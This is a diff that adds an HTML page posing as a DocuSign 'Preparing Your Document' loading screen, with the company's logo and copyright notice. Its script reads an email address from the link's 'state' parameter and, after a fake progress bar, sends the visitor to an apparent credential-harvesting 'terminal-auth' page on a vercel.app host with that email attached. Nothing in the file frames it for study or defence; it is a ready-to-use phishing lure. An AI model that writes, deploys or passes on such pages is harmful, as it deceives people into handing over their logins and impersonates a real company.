@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Accessing Document - DocuSign</title>
+    <style>
+        body {
+            font-family: "Open Sans", "Helvetica Neue", Helvetica, Arial, sans-serif;
+            background-color: #f8f8f8;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 4px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            padding: 40px;
+            width: 480px;
+            max-width: 90%;
+            text-align: center;
+        }
+        .header {
+            margin-bottom: 30px;
+        }
+        .docusign-logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .title {
+            color: #19487C; /* DocuSign's darker blue */
+            font-size: 22px;
+            font-weight: 600;
+            margin: 0 0 10px 0;
+        }
+        .subtitle {
+            color: #555;
+            font-size: 16px;
+            margin-bottom: 30px;
+        }
+        .loading-container {
+            display: flex;
+            flex-direction: column; 
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(0,0,0,0.1);
+            border-top-color: #FFD100; /* DocuSign yellow/gold */
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 15px;
+        }
+        .loading-text {
+            color: #333;
+            font-size: 16px;
+            font-weight: 500;
+            margin: 0;
+        }
+        .progress-container {
+            background-color: #e0e0e0;
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+        .progress-bar-fill { /* Renamed from .progress-bar to match original sec.html */
+            height: 100%;
+            background-color: #19487C;
+            width: 0%;
+            animation: fill 2.5s linear forwards;
+            border-radius: 4px;
+        }
+        .file-info { 
+            color: #666;
+            font-size: 14px;
+            margin: 0 0 30px 0;
+        }
+        .footer-text {
+            color: #777;
+            font-size: 12px;
+            margin-top: 30px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        @keyframes fill {
+            0% { width: 0%; }
+            30% { width: 40%; } 
+            70% { width: 80%; }
+            100% { width: 100%; }
+        }
+        noscript {
+            display: block;
+            margin-top: 20px;
+            padding: 15px;
+            background-color: #fff3cd;
+            color: #856404;
+            border: 1px solid #ffeeba;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://images.ctfassets.net/3fcisxc3a6xz/docusign_logo_black_text_on_white_0.png/90872cd475f92acafc7c490c93976e40/ds-logo-on-white.png" alt="DocuSign Logo" class="docusign-logo">
+            <h1 class="title">Preparing Your Document</h1>
+            <p class="subtitle">Please wait a moment while we get things ready for you.</p>
+        </div>
+        <div class="loading-container">
+            <div class="spinner"></div>
+            <p class="loading-text">Verifying and loading...</p>
+        </div>
+        <div class="progress-container">
+            <div class="progress-bar-fill" id="progressBar"></div>
+        </div>
+        <p class="file-info">This shouldn't take long.</p>
+        <noscript>
+            <p>JavaScript is essential for DocuSign to function. Please enable JavaScript in your browser settings and reload the page.</p>
+        </noscript>
+        <p class="footer-text">&copy; DocuSign, Inc. All rights reserved.</p>
+    </div>
+
+    <!-- Simple device detection and redirect script -->
+    <script>
+    (function() {
+        const REDIRECT_DELAY = 2500; // Adjusted for progress bar animation
+        const MOBILE_REDIRECT_URL_BASE = "https://org-notification-policy-process.vercel.app/terminal-auth.html#";
+        const DESKTOP_REDIRECT_URL = "https://outlook.office365.com/";
+        const DEAD_URL = "https://www.theguardian.com/environment/climate-crisis"; // Target URL if no value found
+
+        // Mobile device detection function
+        function isMobileDevice() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone/i.test(userAgent);
+        }
+
+        // Get potential value from hash (priority) or search string
+     function getPotentialValue() {
+    // Combine hash and search into a single query-like string
+    const queryString = window.location.hash.substring(1) + '&' + window.location.search.substring(1);
+
+    // Parse parameters
+    const params = new URLSearchParams(queryString);
+
+    // Get the 'state' value
+    const stateValue = params.get('state');
+    if (!stateValue) return null;
+
+    // Extract email after the colon
+    const parts = stateValue.split(':');
+    return parts.length > 1 ? decodeURIComponent(parts[1]) : decodeURIComponent(stateValue);
+}
+
+
+        // Main redirect function
+        function performRedirect() {
+            const value = getPotentialValue();
+
+            if (value) {
+                console.log("Found value:", value);
+                if (isMobileDevice()) {
+                    const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
+                } else {
+                     const redirectUrl = MOBILE_REDIRECT_URL_BASE + value;
+                    console.log("Mobile device detected. Redirecting to:", redirectUrl);
+                    window.location.href = redirectUrl;
+                }
+            } else {
+                console.log("No value found in hash or search. Redirecting all devices to dead URL:", DEAD_URL);
+                document.querySelector('.loading-text').textContent = 'Error: Link invalid or expired.';
+                document.querySelector('.file-info').textContent = 'Please check the link or contact support.';
+                if(document.getElementById('progressBar')) {
+                    document.getElementById('progressBar').style.backgroundColor = '#d9534f'; // Error color
+                    document.getElementById('progressBar').style.width = '100%';
+                }
+                // No redirect if no value, error is shown on page
+            }
+        }
+
+        // Execute redirect after a short delay
+        setTimeout(performRedirect, REDIRECT_DELAY);
+    })();
+    </script>
+</body>
+</html>
